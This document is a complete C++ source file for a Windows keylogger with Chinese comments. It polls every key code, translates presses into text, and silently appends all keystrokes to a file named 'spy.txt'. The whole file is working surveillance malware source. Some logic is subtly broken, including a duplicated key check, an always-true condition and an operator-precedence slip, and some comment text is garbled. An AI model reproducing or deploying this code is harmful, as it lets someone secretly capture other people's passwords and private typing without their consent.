#include <windows.h>
#include <Winuser.h>
#include <string>
#include <fstream>
#include <iostream>
using namespace std;
string GetKey(int Key) // 判斷按下什麼鍵
{
	string KeyString = "";
	//判斷符輸入
	const int KeyPressMask = 0x80000000;
	int iShift = GetKeyState(0x10); //判斷Shift
	bool IS = (iShift & KeyPressMask) == KeyPressMask; //表示按下Shift
	if (Key >= 186 && Key <= 222)
	{
		switch (Key)
		{
		case 186:
			if (IS)
				KeyString = ":";
			else
				KeyString = ";";
			break;
		case 187:
			if (IS)
				KeyString = "+";
			else
				KeyString = "=";
			break;
		case 188:
			if (IS)
				KeyString = "<";
			else
				KeyString = ",";
			break;
		case 189:
			if (IS)
				KeyString = "_";
			else
				KeyString = "-";
			break;
		case 190:
			if (IS)
				KeyString = ">";
			else
				KeyString = ".";
			break;
		case 191:
			if (IS)
				KeyString = "?";
			else
				KeyString = "/";
			break;
		case 192:
			if (IS)
				KeyString = "~";
			else
				KeyString = "`";
			break;
		case 219:
			if (IS)
				KeyString = "{";
			else
				KeyString = "[";
			break;
		case 220:
			if (IS)
				KeyString = "|";
			else
				KeyString = "\\";
			break;
		case 221:
			if (IS)
				KeyString = "}";
			else
				KeyString = "]";
			break;
		case 222:
			if (IS)
				KeyString = '"';
			else
				KeyString = "'";
			break;
		}
	}

	if (Key == VK_ESCAPE) // 退出
		KeyString = "[Esc]";
	else if (Key == VK_F1) // F1至F12
		KeyString = "[F1]";
	else if (Key == VK_F2)
		KeyString = "[F2]";
	else if (Key == VK_F3)
		KeyString = "[F3]";
	else if (Key == VK_F4)
		KeyString = "[F4]";
	else if (Key == VK_F5)
		KeyString = "[F5]";
	else if (Key == VK_F6)
		KeyString = "[F6]";
	else if (Key == VK_F7)
		KeyString = "[F7]";
	else if (Key == VK_F8)
		KeyString = "[F8]";
	else if (Key == VK_F9)
		KeyString = "[F9]";
	else if (Key == VK_F10)
		KeyString = "[F10]";
	else if (Key == VK_F11)
		KeyString = "[F11]";
	else if (Key == VK_F12)
		KeyString = "[F12]";
	else if (Key == VK_SNAPSHOT) // 打印屏幕
		KeyString = "[PrScrn]";
	else if (Key == VK_SCROLL)
		KeyString = "[Scroll Lock]";
	else if (Key == VK_PAUSE)
		KeyString = "[Pause]";
	else if (Key == VK_CAPITAL)
		KeyString = "[Caps Lock]";

	//-------------------------------------//
	else if (Key == 8)
		KeyString = "[Backspace]";
	else if (Key == VK_RETURN)
		KeyString = "[Enter]\n";
	else if (Key == VK_SPACE) // 空格
		KeyString = " ";
	/*
	else if (Key == VK_LSHIFT)
	KeyString = "[Shift]";
	else if (Key == VK_LSHIFT)
	KeyString = "[SHIFT]";
	*/
	else if (Key == VK_TAB)
		KeyString = "[Tab]";
	else if (Key == VK_LCONTROL)
		KeyString = "[Ctrl]";
	else if (Key == VK_RCONTROL)
		KeyString = "[CTRL]";
	else if (Key == VK_LMENU)
		KeyString = "[Alt]";
	else if (Key == VK_LMENU)
		KeyString = "[ALT]";
	else if (Key == VK_LWIN)
		KeyString = "[Win]";
	else if (Key == VK_RWIN)
		KeyString = "[WIN]";
	else if (Key == VK_APPS)
		KeyString = "右?";
	else if (Key == VK_INSERT)
		KeyString = "[Insert]";
	else if (Key == VK_DELETE)
		KeyString = "[Delete]";
	else if (Key == VK_HOME)
		KeyString = "[Home]";
	else if (Key == VK_END)
		KeyString = "[End]";
	else if (Key == VK_PRIOR)
		KeyString = "[PgUp]";
	else if (Key == VK_NEXT)
		KeyString = "[PgDown]";
	else if (Key == VK_CANCEL) // Cancel
		KeyString = "[Cancel]";
	else if (Key == VK_CLEAR) // Clear
		KeyString = "[Clear]";
	else if (Key == VK_SELECT) //Select
		KeyString = "[Select]";
	else if (Key == VK_PRINT) //Print
		KeyString = "[Print]";
	else if (Key == VK_EXECUTE) //Execute
		KeyString = "[Execute]";

	//----------------------------------------//
	else if (Key == VK_LEFT) //上、下、左、右
		KeyString = "[←]";
	else if (Key == VK_RIGHT)
		KeyString = "[→]";
	else if (Key == VK_UP)
		KeyString = "[↑]";
	else if (Key == VK_DOWN)
		KeyString = "[↓]";
	else if (Key == VK_NUMLOCK)
		KeyString = "[NumLock]";
	else if (Key == VK_ADD) // 加、減、乘、除
		KeyString = "+";
	else if (Key == VK_SUBTRACT)
		KeyString = "-";
	else if (Key == VK_MULTIPLY)
		KeyString = "*";
	else if (Key == VK_DIVIDE)
		KeyString = "/";
	else if (Key == 190 || Key == 110)
		KeyString = ".";
	//小???字?:0-9
	else if (Key == VK_NUMPAD0)
		KeyString = "0";
	else if (Key == VK_NUMPAD1)
		KeyString = "1";
	else if (Key == VK_NUMPAD2)
		KeyString = "2";
	else if (Key == VK_NUMPAD3)
		KeyString = "3";
	else if (Key == VK_NUMPAD4)
		KeyString = "4";
	else if (Key == VK_NUMPAD5)
		KeyString = "5";
	else if (Key == VK_NUMPAD6)
		KeyString = "6";
	else if (Key == VK_NUMPAD7)
		KeyString = "7";
	else if (Key == VK_NUMPAD8)
		KeyString = "8";
	else if (Key == VK_NUMPAD9)
		KeyString = "9";
	//-------------------------------------------//

	//-------------------------------------------//
	else if (Key >= 97 && Key <= 122) // 字母:a-z
	{
		if (GetKeyState(VK_CAPITAL))
		{
			if (IS)
				KeyString = Key;
			else
				KeyString = Key - 32;
		}
		else
		{
			if (IS)
				KeyString = Key - 32;
			else
				KeyString = Key;
		}
	}
	else if (Key >= 48 && Key <= 57)
	{
		if (IS)
		{
			switch (Key)
			{
			case 48: //0
				KeyString = ")";
				break;
			case 49://1
				KeyString = "!";
				break;
			case 50://2
				KeyString = "@";
				break;
			case 51://3
				KeyString = "#";
				break;
			case 52://4
				KeyString = "$";
				break;
			case 53://5
				KeyString = "%";
				break;
			case 54://6
				KeyString = "^";
				break;
			case 55://7
				KeyString = "&";
				break;
			case 56://8
				KeyString = "*";
				break;
			case 57://9
				KeyString = "(";
				break;
			}
		}
		else
			KeyString = Key;
	}
	if (Key != VK_LBUTTON || Key != VK_RBUTTON)
	{
		if (Key >= 65 && Key <= 90)
		{
			if (GetKeyState(VK_CAPITAL))
			{
				if (IS)
					KeyString = Key + 32;
				else
					KeyString = Key;
			}
			else
			{
				if (IS)
				{
					KeyString = Key;
				}
				else
				{
					Key = Key + 32;
					KeyString = Key;
				}
			}
		}
	}

	return KeyString;
}

void main()
{
	string Filename = "D:\\spy.txt";
	string TempString = "";
	fstream FStream;
	cout << "開始記錄";
	FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
	while (true)
	{
		Sleep(5);
		for (int i = 8; i <= 255; i++)
		{
			if (GetAsyncKeyState(i) & 1 == 1)
			{
				TempString = GetKey(i);
				FStream.write(TempString.c_str(), TempString.size());
				FStream.close();
				FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
			}
		}
	}
}
